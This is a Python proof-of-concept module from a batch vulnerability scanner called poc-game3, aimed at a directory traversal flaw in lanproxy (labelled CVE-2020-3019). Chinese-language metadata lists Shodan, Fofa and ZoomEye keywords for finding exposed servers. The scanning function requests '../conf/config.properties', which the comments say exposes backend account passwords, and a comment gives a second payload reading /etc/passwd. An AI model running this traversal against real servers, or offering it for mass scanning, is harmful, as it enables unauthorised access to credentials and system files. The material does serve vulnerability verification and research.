#! /usr/bin/python3

#poc-game3 一款批量漏洞扫描验证工具 官网：www.poc-game.me

#time 2021-1-10 PM 21:31

#author by Greekn 

import sys,requests

def vulnerability_info(): #漏洞基础信息
    
    loopholename = '漏洞名称:'+'lanproxy目录遍历突破（CVE-2020-3019）' #>>>>漏洞名称
    loopholenumber = '漏洞编号:'+'CVE-2020-3019' #>>>>漏洞编号
    loopholetype = '漏洞类型:'+'dta目录遍历' #>>>> 漏洞类型  RJB 远程破解 LPE 本地提权 SBX 沙盒绕过 RCE 远程代码执行 BSoD 蓝屏崩溃 DOS 拒绝服务 SOP 浏览器跨域 EoP 内核提权 Read 任意地址读写（包括信息泄露）
    middleware = '中间件:'+'X' #>>>> 中间件
    defaultport = '默认开放端口:'+'8090' #>>>> 默认开放端口
    loopholecomponent = '漏洞组件:'+'/../conf/config.properties' #>>>> 漏洞组件
    loopholefeatures ='漏洞特征:'+'目录遍历' #>>>> 漏洞特征
    softwareversion ='受影响组件版本号:'+'v0.1-20171128' #>>>> 受影响组件版本号
    pocurl ='漏洞验证脚本网址:'+'X' #>>>> 漏洞验证脚本网址
    expurl = '漏洞利用脚本网址:'+'X' #>>>> 漏洞利用脚本网址
    loopholedemourl = '漏洞复现网址:'+'https://github.com/r0eXpeR/CVE-2020/blob/main/lanproxy%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-3019%EF%BC%89.md' #>>>> 漏洞复现网址
    foakeyword = 'fofa资产搜索关键词:'+'lanproxy' #>>>> fofa资产搜索关键词
    zoomeyekeyword ='钟馗之眼搜索关键词:'+'lanproxy' #>>>> 钟馗之眼搜索关键词
    shodankeyword ='shodan资产搜索关键词:'+'lanproxy' #>>>> shodan资产搜索关键词
    patchurl = '补丁网址 :'+'X' #>>>>  补丁网址 
    bigdataassets = '大数据资产统计new:'+'zoomeye 3863' #>>>> 大数据资产统计new
    loopholeopentime = '漏洞创建时间:'+'2019-12-10' #>>>> 漏洞创建时间
    timeone = '漏洞收集时间:'+'2021-1-18' #>>>> 漏洞收集时间
    
    #------------------------------漏洞追踪描述-------------------------------------------
    
    loopholetracking ='漏洞追踪笔记:'+'一般' #>>>>漏洞追踪笔记
    networkenvironment ='网络环境:'+'外网/内网' #>>>>网络环境
    attackvector ='攻击向量:'+'Http' #>>>> 攻击向量
    loopholepocopen ='漏洞脚本是否公开:'+'公开' #>>>> 漏洞脚本是否公开 公开/不公开
    loopholedetails ='漏洞细节是否公开: '+'公开' #>>>> 漏洞细节是否公开 公开/不公开
    cvss3 = 'cvss漏洞评分:'+'' #>>>> cvss漏洞评分
    collector ='漏洞收集人:'+'Greekn' #>>>> 漏洞收集人
    email ='漏洞收集人邮箱:'+'X' #>>>>漏洞收集人邮箱
    
    zldir =loopholename+'\n'+loopholenumber+'\n'+loopholetype+'\n'+middleware+'\n'+defaultport+'\n'+loopholecomponent+'\n'+loopholefeatures+'\n'+softwareversion+'\n'+pocurl+'\n'+expurl+'\n'+loopholedemourl+'\n'+foakeyword+'\n'+zoomeyekeyword+'\n'+shodankeyword+'\n'+patchurl+'\n'+bigdataassets+'\n'+loopholeopentime+'\n'+timeone+'\n'
    
    return zldir
    
def poc_payload(self_target): #漏洞PAYLOAD
    #payload 1 /../../../../../../../../../../../../../../etc/passwd
    #payload 2 /../conf/config.properties 读取配置文件 后端账号密码
    results = []
    payload = '../conf/config.properties'
    header ={
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36'
    }
    
    try:
        request = requests.get('http://'+self_target+'/'+payload,headers=header,timeout=1)
        if 'config.server.bind=0.0.0.0' in request.text:
            results.append('[+]漏洞测试存在'+'  '+self_target)
            pass
        
        else:
            results.append('[-]漏洞测试失败'+'   '+self_target)      
            pass
    except:  
        results.append('[-]无法访问目标'+'   '+self_target)
        pass
        
    return results[0]
    
    

    
